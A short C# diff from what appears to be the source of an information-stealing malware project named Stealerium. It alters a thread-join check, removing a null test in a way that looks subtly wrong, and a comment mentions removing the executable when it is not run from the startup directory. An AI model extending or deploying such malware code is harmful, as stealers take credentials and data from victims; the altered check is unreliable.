@@ -90,7 +90,7 @@ namespace Stealerium
                 if (wThread.IsAlive)
                     wThread.Join();
             if (wThread != null)
-                if (cThread != null && cThread.IsAlive)
+                if (cThread.IsAlive)
                     cThread.Join();
 
             // Remove executable if running not from startup directory
